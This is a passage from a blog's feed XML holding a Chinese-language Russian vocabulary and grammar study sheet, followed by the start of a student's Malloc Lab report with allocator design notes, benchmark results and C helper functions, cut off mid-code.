        <content type="html"><![CDATA[<h4 id="及物动词"><a href="#及物动词" class="headerlink" title="及物动词"></a>及物动词</h4><ul><li>(第四课) есть; </li><li>(第五课) делать, читать, считать, искать, знать, слушать; </li><li>(第六课) смотреть, писать, учить;</li><li>(第七课) любить, изучать;</li><li>(第九课) рассказывать, видеть, ждать, петь, вспоминать;</li><li>(第十课) звать;</li><li>(常用) покупать.</li></ul><ol><li><p>делать (做):</p><p>делать урок; делать упражнения (练习);</p></li><li><p>читать (读):</p><p>читать книгу (书); читать текст; читать диалог; читать стихи (诗歌); </p></li><li><p>считать (数):</p><p>считать бананы; </p></li><li><p>искать (寻找):</p><p>искать часы (时间); искать плащ; искать счастье (幸福); </p></li><li><p>знать (了解, 认识):</p><p>знать это; знать тебя; знать русский язык; </p></li><li><p>слушать (听):</p><p>слушать музыку; слушать текст; слушать диалог; слушать стихи;</p></li><li><p>смотреть (看):</p><p>смотреть телевизор (电视); смотреть фильм; </p></li><li><p>писать (写):</p><p>писать письмо; писать новые слова; писать диалог; писать стихи;</p></li><li><p>любить (热爱):</p><p>любить весну и зиму; любить русский язык; Я тебя люблю (我爱你);</p></li><li><p>изучать (研究): </p><p>изучать русский язык; изучать математику; изучать стихи; изучать Пушкина;</p></li><li><p>видеть (看见):</p><p>Вчера мы видели тебя в библиотеке.</p></li><li><p>ждать (等待):</p><p>Мы тебя ждали вчера в аудитории.</p></li><li><p>петь (唱歌):</p><p>Мы поём русскую песню «Подмосковные вечера».</p></li><li><p>звать (招呼; 叫做)</p><p>Как тебя зовут? </p></li></ol><h4 id="非及物动词"><a href="#非及物动词" class="headerlink" title="非及物动词"></a>非及物动词</h4><ul><li>(第五课) работать, отдыхать, ужинать, играть, жить; </li><li>(第六课) говорить, хотеть, обедать, учиться;</li><li>(第七课) идти, ехать, разговаривать, мечтать, отвечать, заниматься;</li><li>(第八课) вставать, завтракать;</li><li>(第九课) лежать, быть, гулять, фотографироваться, собраться;</li><li>(第十课) сидеть, родиться;</li><li>(常用) стоять, лететь.</li></ul><ol><li><p>работать (工作):</p><p>работать на заводе; работать в Пекине; работать в Москве; работать на юге;</p></li><li><p>отдыхать (休息):</p><p>отдыхать дома; отдыхать на юге;</p></li><li><p>завтракать, обедать, ужинать (吃早 / 午 / 晚饭):</p><p>завтракать дома; обедать в кафе; ужинать  в институте; ужинать  в буфете (小吃部);</p></li><li><p>жить (居住):</p><p>жить дома; жить в институте; жить в Санкт-Петербурге;</p></li><li><p>играть (玩):</p><p>играть в футбол; играть в шахматы;</p></li><li><p>говорить (说):</p><p>говорить по-русски; говорить по-китайски;</p></li><li><p>хотеть (想):</p><p>хотеть читать стихи; хотеть смотреть телевизор; хотеть слушать музыку.</p></li><li><p>идти (步行): </p><p>Я иду на урок.</p></li><li><p>ехать (乘车):</p><p>Я еду на работу.</p></li><li><p>разговаривать (交谈):</p><p>Они разговаривают об учебе и о работе. Вы разговариваете о Москве?</p></li><li><p>мечтать (渴望):</p><p>мечтать учиться в России;  мечтать работать на юге;</p></li><li><p>отвечать (回答):</p><p>отвечать на вопросы;</p></li><li><p>стоять (站立):</p><p>На столе стоит красивая ваза.</p></li><li><p>лежать (放置):</p><p>На столе лежат книги и словари.</p></li><li><p>быть (曾经在):</p><p>Вчера вечером Антон и Нина были в театре.</p></li><li><p>гулять (散步):</p><p>Виктор и Анна гуляют в саду.</p></li><li><p>фотографироваться (摄像):</p><p>Они фотографируются в парке.</p></li><li><p>собраться (聚集):</p><p>Вчера мои товарищи собрались вместе. </p></li><li><p>сидеть (坐着):</p><p>Мы сидим в своей красивой аудитории. </p></li><li><p>родиться (出生):</p><p>Он родился в Пекине.</p></li></ol><h4 id="第一变位法"><a href="#第一变位法" class="headerlink" title="第一变位法"></a>第一变位法</h4><p><strong>正常变位</strong></p><ul><li>разговаривать, мечтать, отвечать, изучать, заниматься, покупать (购买), гулять.</li></ul><p><strong>特殊变位</strong></p><ul><li>писать: я пишу, ты пишешь, они пишут;</li><li>жить: я живу, ты живёшь, они живут;</li><li>звать: я зову, ты зовёшь, они зовут;</li><li>искать: я ищу, ты ищешь, они ищут;</li><li>идти: я иду, ты идёшь, они идут; </li><li>ехать: я еду, ты едешь, они едут;</li><li>вставать: я встаю, ты встаёшь, они встают.</li><li>танцевать: я танцую, ты танцуешь, они танцуют.  </li></ul><h4 id="第二变位法"><a href="#第二变位法" class="headerlink" title="第二变位法"></a>第二变位法</h4><p><strong>正常变位</strong></p><ul><li>говорить: я говорю, ты говоришь, они говорят;</li><li>стоять: я стою, ты стоишь, они стоят; </li><li>учить: я учу, ты учишь, они учат;</li><li>учиться: я учусь, ты учишься, они учатся;</li><li>смотреть: я смотрю, ты смотришь, они смотрят;</li></ul><p><strong>特殊变位</strong></p><ul><li>любить: я люблю, ты любишь, они любят.</li><li>лететь (飞行): я лечу, ты летишь, они летят.</li><li>сидеть: я сижу, ты сидишь, они сидят.</li></ul><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><ul><li>говорить по-русски 俄语</li><li>говорить по-китайски 汉语</li><li>говорить по-английски 英语</li></ul><h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><ul><li>один час;</li><li>два / три / четыре часа;</li><li>пять / шесть / семь / восемь / девять / десять / одиннадцать / двенадцать часов.</li></ul><h4 id="星期"><a href="#星期" class="headerlink" title="星期"></a>星期</h4><ul><li>понедельник, вторник, среда, четверг, пятница, суббота, воскресенье.</li></ul><h4 id="月份"><a href="#月份" class="headerlink" title="月份"></a>月份</h4><ul><li>январь, февраль, март, апрель;</li><li>май, июнь, июль, август;</li><li>сентябрь, октябрь, ноябрь, декабрь.</li></ul><h4 id="第一至六课词组"><a href="#第一至六课词组" class="headerlink" title="第一至六课词组"></a>第一至六课词组</h4><ul><li>我 / 你 / 您 / 他 / 她叫… меня / тебя / вас / его / её зовут…</li><li>在喷泉旁 у фонтана</li><li>您的儿子 ваш сын</li><li>我的朋友 мой друг; моя подруга</li><li>你们的新房子 ваш новый дом</li><li>我的旧作业本 моя старая тетрадь</li><li>他的新车 его новая машина</li><li>我们的旧桌子 наш старый стол</li><li>你们的旧花园 ваш старый сад</li><li>他们的新护照 их новые паспорта</li><li>在工厂工作 работать на заводе</li><li>在学院里工作 работать в институте</li><li>在剧院里工作 работать в театре</li><li>懂俄语 знать русский язык</li><li>了解你 знать тебя</li><li>听音乐 слушать музыку</li><li>在南方休息  отдыхать на юге</li><li>在疗养院休息 отдыхать в санатории</li><li>在家休息 отдыхать дома</li><li>在家吃早餐 завтракать дома</li><li>在咖啡厅吃午餐 обедать в кафе</li><li>在小吃部吃晚餐 ужинать в буфете</li><li>在教室里做功课 делать урок в аудитории</li><li>在宿舍里做练习 делать упражнение в общежитии</li><li>踢足球 играть в футбол</li><li>下象棋 играть в шахматы</li><li>数香蕉 считать бананы</li><li>写生词 писать новые слова</li><li>住在莫斯科 жить в Москве</li><li>住在上海 жить в Шанхае</li><li>背单词 учить новые слова</li><li>渴望上大学 хотеть учиться в университете</li><li>渴望在俄罗斯留学 хотеть учиться в России</li><li>关于我 обо мне</li><li>3点钟 три часа</li><li>5点钟 пять часов</li><li>看电视 смотреть телевизор</li><li>看书 читать книгу</li><li>寻找教科书 искать учебник</li><li>请问 скажите пожалуйста</li><li>几点钟 который час</li><li>很好 очень хорошо</li></ul><h4 id="第七课词组"><a href="#第七课词组" class="headerlink" title="第七课词组"></a>第七课词组</h4><ol><li>俄语学院 Институт русского языка</li><li>学习研究俄语 изучать русский язык</li><li>在课堂上 на уроке </li><li>回答问题 отвечать на вопросы</li><li>做很多练习 делать упражнения</li><li>懂俄语 знать русский язык</li><li>谈论有关学习和生活的事情 разговаривать об учёбе и о жизни</li><li>学院里的生活 жизнь в институте</li><li>向往着留学俄罗斯 мечтать учиться в России</li><li>去上班 идти на работу </li><li>乘车去莫斯科 ехать в Москву</li><li>喜欢春天 любить весну</li><li>报刊和杂志 газета и журнал</li></ol><h4 id="第九课词组"><a href="#第九课词组" class="headerlink" title="第九课词组"></a>第九课词组</h4><ol><li>写生词 писать новые слова</li><li>看电视 смотреть телевизор</li><li>在教室里上自习 заниматься в аудитории</li><li>在宿舍休息 отдыхать в общежитии</li><li>好朋友  большие друзья (хорошие друзья)</li><li>喜欢数学 любить математику</li><li>做家庭作业 делать домашние задания</li><li>出行日 выходной день</li><li>弹吉他  играть на гитаре</li><li>乘车去听音乐会  ехать на концерт</li><li>看电影  смотреть фильм</li><li>好久没见到你 давно тебя не видеть</li><li>在学院里等你 ждать тебя в институте</li><li>上大学 учиться в университете</li><li>唱俄语歌 петь русские песни</li><li>在莫大学习 учиться в МГУ</li><li>中小学同学 школьные товарищи</li></ol><h4 id="第十课词组"><a href="#第十课词组" class="headerlink" title="第十课词组"></a>第十课词组</h4><ol><li>出生在莫斯科 родиться в Москве</li><li>在中学工作 работать в средней школе</li><li>大而美丽的城市 большой и красивый город</li><li>长江 река Янцзы</li><li>在童年 в детстве</li><li>在北大上学 учиться в Пекинском университете</li><li>俄罗斯语言与文学 русский язык и литература</li><li>每天 каждый день</li><li>除此以外 кроме того</li><li>听俄语诗歌 слушать русские стихи</li><li>好教师 хороший преподаватель</li><li>令人愉悦的和善良的人 весёлый и добрый человек</li><li>熟知故乡的城市 хорошо знать свой родной город</li><li>喜欢听他的故事 любить слушать его рассказы</li><li>著名的地方 знаменитые места</li><li>红场 Красная площадь</li><li>历史博物馆 Исторический музей</li><li>大剧院 Большой театр</li><li>冬宫 Зимний дворец</li><li>晚报 вечерняя газета</li><li>我的父母双亲 мои родители</li></ol><h4 id="重点词组"><a href="#重点词组" class="headerlink" title="重点词组"></a>重点词组</h4><ol><li>吃新鲜的菠萝 есть свежие ананасы</li><li>吃热汤 есть горячий суп</li><li>读书和报刊杂志 читать книгу, газету и журнал</li><li>听音乐 слушать музыку</li><li>在美丽的花园里散步 гулять в красивом саду</li><li>在周六  в субботу</li><li>谈论关于我的情况  разговаривать обо мне</li><li>乘公共汽车  ехать на автобусе</li><li>乘坐地铁  ехать на метро</li><li>谈论关于我的生活和工作  разговаривать о моей жизни и работе</li><li>飞往莫斯科 лететь в Москву</li><li>师范学院  педагогический институт</li><li>医学院  медицинский институт</li><li>历史系  исторический факультет</li><li>一年四季  времена года</li><li>站在喷泉旁 стоять у фонтана</li><li>背单词 учить новые слова</li><li>6点钟 шесть часов</li><li>唱歌跳舞 петь и танцевать</li><li>回忆起学校和老师同学 вспоминать о школе, об учителях и товарищах</li><li>高楼  большие дома</li><li>起床很早 вставать рано</li><li>他有课 у него уроки</li><li>购买蔬菜和苹果 покупать овощи и яблоки</li><li>回答问题 отвечать на вопросы</li><li>去上班 идти на работу</li><li>梦想在俄罗斯学习 мечтать учиться в России</li><li>美丽的花朵 красивые цветы</li><li>写信 писать письмо</li><li>在小吃部吃午饭 обедать в буфете</li></ol><h4 id="形容词"><a href="#形容词" class="headerlink" title="形容词"></a>形容词</h4><p><strong>硬变化</strong></p><ul><li>新的 новый, новая, новое, новые;</li><li>旧的 старый, старая, старое, старые;</li><li>美丽的 красивый, красивая, красивое, красивые;</li><li>美味的 вкусный, вкусная, вкусное, вкусные;</li><li>时尚的 модный, модная, модное, модные;</li><li>红色的 красный, красная, красное, красные;</li><li>学校的 школьный, школьная, школьное, школьные;</li><li>年青的 молодой, молодая, молодое, молодые; </li><li>大的 большой, большая, большое, большие; </li><li>不好的 плохой，плохая, плохое, плохие; </li><li>英国的  английский, английская, английское, английские; </li></ul><p><strong>软变化</strong></p><ul><li>家庭的 домашний, домашняя, домашнее, домашние; </li><li>蓝色的 синий, синяя, синее, синие; </li><li>晚上的 вечерний，вечерняя, вечернее, вечерние; </li><li>冬日的 зимний, зимняя, зимнее, зимние; </li><li>好的 хороший，хорошая, хорошее, хорошие; </li><li>新鲜的 свежий，свежая, свежее, свежие; </li><li>滚烫的 горячий, горячая, горячее, горячие. </li></ul><h4 id="на-固定词组-第四格"><a href="#на-固定词组-第四格" class="headerlink" title="на 固定词组 (第四格)"></a>на 固定词组 (第四格)</h4><p>на завод, на рынок, на мост, на работу, на урок, на лекцию, на выставку, на концерт, на почту, на кухню, на фирму, на улицу, на проспект, на стадион, на остановку автобуса, на обед, на ужин, на завтрак, на собрание, на юг, на вокзал, на футбол, на гору, на занятия, на факультет, на реку, на озеро, на поле, на море.</p><h4 id="об-固定词组-第六格"><a href="#об-固定词组-第六格" class="headerlink" title="об 固定词组 (第六格)"></a>об 固定词组 (第六格)</h4><p>обо мне, об учёбе, об аудитории, об общежитии, об уксусе, об автобусе, об остановке, об ухе, об яйце, об языке, об ужине, об Европе, об Азии, об имени, об Интернете, об отце, об юге, об овощах, об обуви, об обеде, об осени, об озере, об июле, об июне, об улице, об учителе, об учительнице, об январе, об апреле, об августе, об октябре.</p><h4 id="问答题"><a href="#问答题" class="headerlink" title="问答题"></a>问答题</h4><ol><li><p>Кто твой отец? </p><p>Мой отец инженер. Он работает на заводе.</p></li><li><p>Что стоит на столе? </p><p>На столе стоят красивые цветы.</p></li><li><p>Что ты читаешь? </p><p>Я читаю книгу и газету.</p></li><li><p>Что делала Инна вчера вечером? </p><p>Вчера вечером она смотрела телевизор.</p></li><li><p>Какой язык ты знаешь? </p><p>Я знаю китайский и русский языки.</p></li><li><p>Который час сейчас?</p><p>Сейчас два часа.</p></li><li><p>Куда они едут?</p><p>Они едут в Москву.</p></li><li><p>Когда ты встаёшь утром каждый день? </p><p>Каждый день утром я встаю в шесть часов.</p></li><li><p>Где Миша учился раньше? </p><p>Раньше он учился в Санкт-Петербурге.</p></li><li><p>Где Виктор был вчера? </p><p>Вчера он был в институте.</p></li><li><p>Чья это машина? </p><p>Это моя машина.</p></li><li><p>Какой сегодня день? </p><p>Сегодня понедельник.</p></li><li><p>Почему Анна много работает? </p><p>Она хочет учиться в России.</p></li><li><p>Какое время года ты любишь? </p><p>Я люблю весну и зиму.</p></li><li><p>Где учится твой брат? </p><p>Мой брат учится в МГУ.</p></li><li><p>Ребята хорошо знают о тебе? </p><p>Да, они хорошо знают обо мне.</p></li><li><p>О чём вы разговариваете? </p><p>Мы разговариваем об учёбе и о жизни в университете.</p></li><li><p>О ком рассказывал ваш преподаватель сегодня на уроке? </p><p>Сегодня на уроке он рассказывал о великом русском поэте Пушкине.</p></li><li><p>В каком городе ты живёшь? </p><p>Я живу в большом и красивом городе Шанхае.</p></li><li><p>Где вы родились?</p><p>Я родился в Москве.</p></li><li><p>Где вы учились раньше? </p><p>Раньше мы учились в школе.</p></li><li><p>Какой язык они учили в школе? </p><p>В школе они учили английский язык.</p></li><li><p>Как вы говорите по-русски? </p><p>Мы говорим по-русски очень хорошо.</p></li><li><p>Где обычно занимаются студенты? </p><p>Они обычно занимаются в аудиториях и библиотеках.</p></li><li><p>Какой язык изучает Виктор? </p><p>Он изучает китайский язык.</p></li><li><p>Что ты делал вчера вечером? </p><p>Вчера вечером я писал новые слова.</p></li><li><p>Кто такой Антон? </p><p>Антон хороший преподаватель, весёлый и добрый человек.</p></li><li><p>Какой ваш родной город?</p><p>Мой родной город — Пекин.</p></li><li><p>Ты любишь изучать русский язык? </p><p>Да, я люблю изучать русский язык.</p></li><li><p>Когда у вас уроки русского языка? </p><p>У нас уроки русского языка во вторник и в пятницу. </p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 3</title>
      <link href="/2022/12/25/ji-suan-ji-xi-tong-gai-lun-lab-3/"/>
      <url>/2022/12/25/ji-suan-ji-xi-tong-gai-lun-lab-3/</url>
      
        <content type="html"><![CDATA[<h1 id="Lab-3-Malloc-Lab-实验报告"><a href="#Lab-3-Malloc-Lab-实验报告" class="headerlink" title="Lab 3 Malloc Lab 实验报告"></a>Lab 3 Malloc Lab 实验报告</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>使用 $C$ 语言实现一个 $Dynamic$ $Storage$ $Allocater$.</li><li>实现并优化 $malloc$, $free$, $realloc$ 等功能.</li><li>熟练 $gdb$ 调试技巧.</li></ul><h2 id="最终性能"><a href="#最终性能" class="headerlink" title="最终性能"></a>最终性能</h2><p>在最终提交的版本中, 我对 $mm.c$ 的相关实现策略如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Data Structure -------- Explicit Free List <span class="token punctuation">(</span>Double Linked List<span class="token punctuation">)</span>  / Allocated Block --- Header, Payload and Footer  <span class="token punctuation">\</span> Free Block -------- Header, Pred_ptr, Succ_ptr and FooterFit Strategy ---------- First FitCoalesce Strategy ----- Immediate CoalesceRealloc Strategy ------ First Try to Coalesce, Then Try to Malloc and Free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终实现的性能如下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">46</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">11</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">86</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Version-0"><a href="#Version-0" class="headerlink" title="Version 0"></a>Version 0</h2><p>$Version$ $0$ 为未作任何修改的原始 $mm.c$ 文件, 直接进行测试的结果.</p><h3 id="Block-Structure"><a href="#Block-Structure" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>在原始 $mm.c$ 文件中, 一个 $block$ 没有 $header$ 或 $footer$ 标记, 也不会被 $coalesce$ 或 $reuse$.</p><h3 id="Helper-Functions"><a href="#Helper-Functions" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><ul><li>没有实现任何 $helper$ $function$ 以辅助进行内存块的分配.</li><li>所有内存块不进行 $coalesce$, 经过 $free$ 后不会被 $malloc$ 或 $realloc$ 复用.</li></ul><h3 id="Malloc-Functions"><a href="#Malloc-Functions" class="headerlink" title="Malloc Functions"></a>Malloc Functions</h3><h4 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h4><ul><li>不进行 $init$, 直接返回.</li></ul><h4 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h4><ul><li>将 $size$ 对齐至 $16$ 字节, 直接调用 $mem_sbrk$ 申请新的堆区域, 并返回一个指向连续内存块的指针.</li></ul><h4 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h4><ul><li>不进行 $free$, 直接返回.</li></ul><h4 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h4><ul><li>直接调用 $mm_malloc$ 分配 $newptr$. </li><li>如果 $newptr$ 为 $NULL$, 此时堆可扩展内存不足, 直接返回 $NULL$.</li><li>否则, 依据大小关系将 $ptr$ 指向的旧内存块内容复制到 $newptr$ 指向的新块.</li></ul><h3 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Results <span class="token keyword">for</span> mm malloc:trace            name     valid  util     ops      secs   Kops <span class="token number">1</span>     amptjp-bal.rep       <span class="token function">yes</span>   <span class="token number">23</span>%    <span class="token number">5694</span>  <span class="token number">0.000070</span>  <span class="token number">81459</span> <span class="token number">2</span>       cccp-bal.rep       <span class="token function">yes</span>   <span class="token number">19</span>%    <span class="token number">5848</span>  <span class="token number">0.000072</span>  <span class="token number">81110</span> <span class="token number">3</span>    cp-decl-bal.rep       <span class="token function">yes</span>   <span class="token number">30</span>%    <span class="token number">6648</span>  <span class="token number">0.000084</span>  <span class="token number">78768</span> <span class="token number">4</span>       expr-bal.rep       <span class="token function">yes</span>   <span class="token number">40</span>%    <span class="token number">5380</span>  <span class="token number">0.000066</span>  <span class="token number">82137</span> <span class="token number">5</span> coalescing-bal.rep        no     -       -         -      - <span class="token number">6</span>     random-bal.rep        no     -       -         -      - <span class="token number">7</span>    random2-bal.rep        no     -       -         -      - <span class="token number">8</span>     binary-bal.rep       <span class="token function">yes</span>   <span class="token number">54</span>%   <span class="token number">12000</span>  <span class="token number">0.000144</span>  <span class="token number">83624</span> <span class="token number">9</span>    binary2-bal.rep       <span class="token function">yes</span>   <span class="token number">47</span>%   <span class="token number">24000</span>  <span class="token number">0.000186</span> <span class="token number">128755</span><span class="token number">10</span>    realloc-bal.rep        no     -       -         -      -<span class="token number">11</span>   realloc2-bal.rep        no     -       -         -      -Total                               -       -         -      -Score <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">12</span> <span class="token punctuation">(</span>util<span class="token punctuation">)</span> + <span class="token number">40</span> <span class="token punctuation">(</span>thru<span class="token punctuation">))</span> * <span class="token number">6</span>/11 <span class="token punctuation">(</span>testcase<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">28</span>/100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>此时实现的分配器尚不能正确实现所有任务.</p><p>$Kops$ 满足要求, 但 $Memory$ $Utilization$ 过低.</p></blockquote><h2 id="Version-1"><a href="#Version-1" class="headerlink" title="Version 1"></a>Version 1</h2><p>参考 $CSAPP3e$ : $9.9.12$ 中的实现, 采用 $Implicit$ $Free$ $List$ 组织空闲块.</p><h3 id="Block-Structure-1"><a href="#Block-Structure-1" class="headerlink" title="Block Structure"></a>Block Structure</h3><p>一个 $block$ 的结构被组织为:</p><p><img src="/pic/46.png" alt=""></p><p>考虑 $Boundary$ $Tags$ 与 $Alignment$ 条件, 此时 $minimum$ $block$ $size$ 为 $4 * WSIZE\,(32\,Bytes)$.</p><p>$Implicit$ $Free$ $List$ 被组织为:</p><p><img src="/pic/47.png" alt=""></p><p>其中 $heap_listp$ 初始默认指向 $Prologue$ $Block$, 而 $Epilogue$ $Block$ 在进行 $coalesce$ 时可以用于消除边界条件.</p><h3 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h3><p>相关 $Macro$ $Definition$ 完全参考了 $CSAPP3e$ : $9.9.12$ 中的实现.</p><h3 id="Helper-Functions-1"><a href="#Helper-Functions-1" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><h4 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">first_fit</span><span class="token punctuation">(</span>size_t asize<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>bp <span class="token operator">=</span> heap_lo<span class="token punctuation">;</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> bp <span class="token operator">=</span> <span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> asize<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> bp<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>采用 $first$ $fit$ 查询 $free$ $block$, 其中 $heap_lo$ 为定义的 $Implicit$ $Free$ $List$ 的起始地址.</li><li>若 $no$ $fit$, 则返回 $NULL$.</li></ul><h4 id="place"><a href="#place" class="headerlink" title="place"></a>place</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span> size_t asize<span class="token punctuation">)</span> <span class="token punctuation">{</span>  size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size <span class="token operator">-</span> asize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>   <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>将大小为 $asize$ 的块放置在 $bp$ 指向的 $free$ $block$ 处. </li><li>由于 $minimum$ $block$ $size$ 为 $4 * WSIZE$, 若剩余 $payloader$ 的 $size$ 过大, 则进行 $split$ 操作产生一个新的 $free$ $block$.</li></ul><h4 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">coalesce</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">)</span> <span class="token punctuation">{</span>  size_t prev_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">PREV_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size_t next_alloc <span class="token operator">=</span> <span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size_t size <span class="token operator">=</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>prev_alloc <span class="token operator">&amp;&amp;</span> next_alloc<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token 